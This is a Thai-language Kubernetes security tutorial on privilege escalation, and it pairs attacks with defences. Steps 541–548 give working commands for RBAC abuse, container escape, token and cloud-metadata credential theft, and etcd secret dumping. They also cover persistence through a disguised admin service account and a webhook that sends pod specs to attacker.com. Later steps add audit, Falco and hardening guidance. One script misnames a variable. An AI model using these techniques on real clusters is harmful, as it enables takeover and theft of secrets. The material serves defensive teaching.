# Part 55: Kubernetes Privilege Escalation
## Steps 541-550: การยกระดับสิทธิ์ใน Kubernetes

---

> ⚠️ **คำเตือน**: เนื้อหานี้มีไว้เพื่อการศึกษา การป้องกัน และการทดสอบที่ได้รับอนุญาตเท่านั้น
> ห้ามนำไปใช้กับระบบที่ไม่ได้รับอนุญาตโดยเด็ดขาด

---

## 📖 บทนำ

Privilege Escalation ใน Kubernetes คือการที่ผู้โจมตีเริ่มต้นด้วยสิทธิ์จำกัด แล้วยกระดับสิทธิ์เป็น cluster-admin หรือ root บน node ได้

### เส้นทาง Privilege Escalation
```
Unprivileged Pod
      │
      ├─ RBAC Misconfiguration ────────→ Cluster Admin
      │
      ├─ ServiceAccount Token ─────────→ API Access
      │                                        │
      ├─ Container Escape ───────────→ Node Root
      │                                        │
      └─ HostPath Volume ────────────→ Host Filesystem
```

---

## Step 541: RBAC Privilege Escalation

### Scenario 1: Wildcard Permissions
```yaml
# ❌ อันตราย! Wildcard permissions
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: over-privileged
rules:
  - apiGroups: ["*"]       # ทุก API group
    resources: ["*"]       # ทุก resource
    verbs: ["*"]           # ทุก action
    # = cluster-admin โดยพฤตินัย!
```

### Scenario 2: Create/Patch RBAC Objects
```bash
# ถ้า ServiceAccount มีสิทธิ์ create/patch roles หรือ rolebindings
# ผู้โจมตีสามารถสร้าง binding ใหม่ให้ตัวเองเป็น admin

# ตรวจสอบว่า SA มีสิทธิ์นี้ไหม

kubectl auth can-i create clusterrolebindings
kubectl auth can-i create rolebindings -n kube-system

# ถ้ามีสิทธิ์ → escalate
kubectl create clusterrolebinding attacker-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=default:default
```

### Scenario 3: impersonate สิทธิ์
```yaml
# ถ้า SA มี impersonate permissions
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: can-impersonate
rules:
  - apiGroups: [""]
    resources: ["users", "groups", "serviceaccounts"]
    verbs: ["impersonate"]
```

```bash
# ใช้ impersonate เพื่อ escalate
kubectl get pods --as=system:masters  # impersonate cluster admin group
kubectl get secrets --as=admin-user
```

### Scenario 4: create pods กับ serviceaccount
```yaml
# ถ้ามีสิทธิ์ create pods และมี SA ที่มีสิทธิ์สูง
apiVersion: v1
kind: Pod
metadata:
  name: privilege-escalation
spec:
  serviceAccountName: cluster-admin-sa   # ← SA ที่มีสิทธิ์สูง
  containers:
    - name: attacker
      image: bitnami/kubectl:latest
      command: ["sleep", "3600"]
```

---

## Step 542: Container Escape Techniques

### Scenario 1: Privileged Container
```yaml
# Container ที่ privileged: true มี root access ของ host
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
    - name: app
      image: ubuntu
      securityContext:
        privileged: true    # ← ประตูสู่ host!
      command: ["sleep", "3600"]
```

```bash
# เข้าไปใน privileged container
kubectl exec -it privileged-pod -- /bin/bash

# ใน container:
# Mount host filesystem
mkdir /host-root
mount /dev/sda1 /host-root    # หรือ disk ที่ถูกต้อง

# อ่าน kubeconfig ของ node
cat /host-root/etc/kubernetes/admin.conf

# Chroot ไป host
chroot /host-root /bin/bash
# ตอนนี้เป็น root บน host node!
```

### Scenario 2: hostPath Volume Escape
```yaml
# Mount sensitive host paths
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-escape
spec:
  containers:
    - name: app
      image: ubuntu
      volumeMounts:
        - name: host-root
          mountPath: /host
  volumes:
    - name: host-root
      hostPath:
        path: /      # Mount host root filesystem!
```

```bash
# เข้าไปใน pod
kubectl exec -it hostpath-escape -- /bin/bash

# อ่าน kubeconfig
cat /host/etc/kubernetes/admin.conf

# อ่าน etcd data
ls /host/var/lib/etcd/
```

### Scenario 3: Docker Socket Mount
```yaml
# Mount docker.sock → control host Docker
apiVersion: v1
kind: Pod
metadata:
  name: docker-sock-escape
spec:
  containers:
    - name: app
      image: docker:latest
      volumeMounts:
        - name: docker-sock
          mountPath: /var/run/docker.sock
  volumes:
    - name: docker-sock
      hostPath:
        path: /var/run/docker.sock    # Docker socket!
```

```bash
# ใช้ Docker socket เพื่อ escape
# สร้าง privileged container บน host
docker run -it --privileged --net=host --pid=host \
  -v /:/host ubuntu:latest \
  chroot /host /bin/bash
```

---

## Step 543: HostPID และ HostNetwork

### HostPID Escape
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hostpid-escape
spec:
  hostPID: true    # ← share host PID namespace
  containers:
    - name: app
      image: ubuntu
      command: ["sleep", "3600"]
      securityContext:
        capabilities:
          add: ["SYS_PTRACE"]
```

```bash
# ใน pod: nsenter เข้าไปใน host namespace
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# ตอนนี้อยู่ใน host namespace!
```

### HostNetwork Escape
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hostnetwork-escape
spec:
  hostNetwork: true    # ← share host network namespace
  containers:
    - name: app
      image: ubuntu
      command: ["sleep", "3600"]
```

```bash
# ใน pod: มีสิทธิ์เข้าถึง host network
ip addr    # ดู host network interfaces
ss -tlnp   # ดู listening ports บน host

# เข้าถึง API Server โดยตรงบน host
curl -k https://127.0.0.1:6443/api/v1
```

---

## Step 544: ServiceAccount Token Abuse

### ค้นหา High-Privileged Service Accounts
```bash
# ดู ClusterRoleBindings ที่ให้สิทธิ์สูง
kubectl get clusterrolebindings -o json | jq '
  .items[] |
  select(.roleRef.name == "cluster-admin") |
  {name: .metadata.name, subjects: .subjects}'

# ดู Roles/ClusterRoles ที่มี wildcard permissions
kubectl get clusterroles -o json | jq '
  .items[] |
  select(.rules[]?.resources[]? == "*" or .rules[]?.verbs[]? == "*") |
  .metadata.name'
```

### ใช้ Token เพื่อ Access API
```bash
# เก็บ token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISDERVER=https://kubernetes.default.svc
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# ใช้ token เรียก API
curl --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces

# ดู secrets ทั้งหมด
# (educational - ทั้งหมดเป็นนี้เพื่อสาธิต authorized testing)
curl --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/secrets
```

---

## Step 545: Cloud Metadata API Exploitation

### AWS EC2 Instance Metadata
```bash
# ถ้า cluster อยู่บน AWS EC2
# Pod อาจ access Instance Metadata Service (IMDS)

# Access metadata
curl http://169.254.169.254/latest/meta-data/

# ดึง IAM role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# ป้องกัน: ใช้ IMDSv2 และ limit hop count = 1
aws ec2 modify-instance-metadata-options \
  --instance-id <id> \
  --http-put-response-hop-limit 1 \
  --http-tokens required
```

### GCP Metadata Server
```bash
# ถ้า cluster อยู่บน GKE
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/

# ดึง service account token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

---

## Step 546: etcd Exploitation

### Access etcd โดยตรง
```bash
# ถ้า etcd port เปิดอยู่และไม่มี auth (2379-2380)

# ตรวจสอบ
nmap -p 2379,2380 <etcd-node-ip>

# ถ้าเปิดและไม่มี TLS
etcdctl --endpoints=http://<etcd-ip>:2379 get / --prefix --keys-only

# ดึงทุก secrets!
etcdctl --endpoints=http://<etcd-ip>:2379 \
  get /registry/secrets --prefix
```

---

## Step 547: Lateral Movement

### Cross-Namespace Access
```bash
# ถ้า NetworkPolicy ไม่ถูกตั้ง
# Pod ใน namespace A สามารถ access Pod ใน namespace B

# จาก attacker pod
curl http://service-name.target-namespace.svc.cluster.local:80/api/admin
```

### Service Discovery
```bash
# ค้นหา services ที่น่าสนใจ
# Internal DNS: <service>.<namespace>.svc.cluster.local

# ใน pod
cat /etc/resolv.conf

# DNS enumeration
nslookup kubernetes.default
nslookup kube-apiserver.kube-system

# ค้นหา services ด้วย environment variables
env | grep _SERVICE_HOST
env | grep _SERVICE_PORT
```

---

## Step 548: Persistence Techniques

### สร้าง Backdoor ServiceAccount
```yaml
# สร้าง hidden SA ที่มีสิทธิ์สูง
apiVersion: v1
kind: ServiceAccount
metadata:
  name: monitoring-agent    # ชื่อที่ดูไม่น่าสงสัย
  namespace: kube-system

---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: monitoring-agent-binding
subjects:
  - kind: ServiceAccount
    name: monitoring-agent
    namespace: kube-system
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

### Malicious Admission Webhook
```yaml
# MutatingAdmissionWebhook สามารถ inject malicious containers
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: mutating-webhook
webhooks:
  - name: inject.malicious.com
    admissionReviewVersions: ["v1"]
    clientConfig:
      url: https://attacker.com/inject    # ส่ง pod spec ไปให้ attacker
    rules:
      - operations: ["CREATE"]
        apiGroups: ["*"]
        apiVersions: ["*"]
        resources: ["pods"]
    sideEffects: None
```

---

## Step 549: Detection และ Remediation

### ตรวจจับ Privilege Escalation

#### Audit Logs
```yaml
# audit-policy.yaml - เปิด audit logging
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  # Log ทุก actions บน secrets
  - level: Metadata
    resources:
      - group: ""
        resources: ["secrets"]
  
  # Log privileged pod creation
  - level: Request
    verbs: ["create"]
    resources:
      - group: ""
        resources: ["pods"]
  
  # Log RBAC changes
  - level: RequestResponse
    resources:
      - group: "rbac.authorization.k8s.io"
        resources: ["clusterrolebindings", "rolebindings"]
  
  # Log exec/attach
  - level: RequestResponse
    verbs: ["create"]
    resources:
      - group: ""
        resources: ["pods/exec", "pods/attach"]
```

#### Falco Rules
```yaml
# ตรวจจับ privilege escalation patterns
- rule: Terminal shell in container
  desc: A shell was opened in a container
  condition: >
    spawned_process and container
    and shell_procs and proc.tty != 0
  output: >
    A shell was opened in a container
    (user=%user.name container=%container.name 
     image=%container.image.repository)
  priority: WARNING

- rule: Privileged container
  desc: Container with privileged=true started
  condition: >
    container_started and container.privileged=true
  output: >
    Privileged container started
    (user=%user.name image=%container.image.repository)
  priority: WARNING
```

### Remediation Steps
```bash
# 1. ตรวจหา over-privileged RBAC
kubectl get clusterrolebindings -o json | jq '
  .items[] |
  select(.roleRef.name == "cluster-admin") |
  {name: .metadata.name, subjects: .subjects}'

# 2. ลบ RBAC ที่ไม่จำเป็น
kubectl delete clusterrolebinding <suspicious-binding>

# 3. ตรวจหา privileged pods
kubectl get pods -A -o json | jq '
  .items[] |
  select(.spec.containers[].securityContext.privileged == true) |
  {name: .metadata.name, ns: .metadata.namespace}'

# 4. Apply Pod Security Standards
kubectl label namespace my-app \
  pod-security.kubernetes.io/enforce=restricted

# 5. Enable Network Policies
kubectl apply -f default-deny-all.yaml

# 6. Rotate compromised tokens
kubectl delete secret <compromised-sa-secret>

# 7. ติดตั้ง Falco สำหรับ runtime monitoring
helm install falco falcosecurity/falco -n falco
```

---

## Step 550: Security Hardening Checklist

### เช็คลิสต์ครบถ้วน
```bash
# API Server Hardening
# --anonymous-auth=false
# --authorization-mode=Node,RBAC
# --enable-admission-plugins=NodeRestriction,PodSecurityAdmission
# --audit-log-path=/var/log/audit.log
# --audit-policy-file=/etc/kubernetes/audit-policy.yaml
# --encryption-provider-config=/etc/kubernetes/enc/encryption-config.yaml

# etcd Hardening
# --client-cert-auth=true
# --peer-client-cert-auth=true
# จำกัด access เฉพาะ control plane nodes

# Node Hardening
# kubelet: --anonymous-auth=false
# kubelet: --authorization-mode=Webhook
# ใช้ CIS Benchmark
```

### ต่อเนื่องจาก kube-bench
```bash
# Run kube-bench
kubectl apply -f kube-bench-job.yaml
kubectl logs -n kube-system job/kube-bench

# ตรวจสอบ API Server manually
kubectl describe pod kube-apiserver-<node> -n kube-system | \
  grep -E "anonymous-auth|authorization-mode|enable-admission-plugins"
```

---

## 📊 สรุป Part 55

| เทคนิค | ประเภท | ความเสี่ยง | การป้องกัน |
|--------|--------|-----------|------------|
| Wildcard RBAC | Privilege Escalation | Critical | Least privilege |
| Privileged Container | Container Escape | Critical | Pod Security Standards |
| hostPath Volume | Container Escape | High | Disallow dangerous paths |
| Docker Socket Mount | Container Escape | Critical | Remove from pods |
| SA Token Theft | Lateral Movement | High | automountServiceAccountToken: false |
| Cloud IMDS Abuse | Privilege Escalation | High | IMDSv2, Network policy |
| etcd Direct Access | Information Disclosure | Critical | TLS, firewall |

---

## 🛡️ การป้องกันสรุป

1. **Least Privilege RBAC** - ให้สิทธิ์น้อยที่สุดที่จำเป็น
2. **Pod Security Standards** - enforce restricted policy
3. **Network Policies** - default deny all
4. **Encryption at Rest** - encrypt etcd secrets
5. **Audit Logging** - log ทุก sensitive operations
6. **Runtime Security** - ใช้ Falco
7. **Image Scanning** - scan ด้วย Trivy ก่อน deploy
8. **Regular kube-bench** - ตรวจ CIS benchmark สม่ำเสมอ

---

## 🔗 ต่อไป
- [Part 56: Container Escape Deep Dive](./part-56-k8s-container-escape.md)
- [Part 57: RBAC Abuse](./part-57-k8s-rbac-abuse.md)

---
*Part 55 | Steps 541-550 | ระดับสูง - Security*
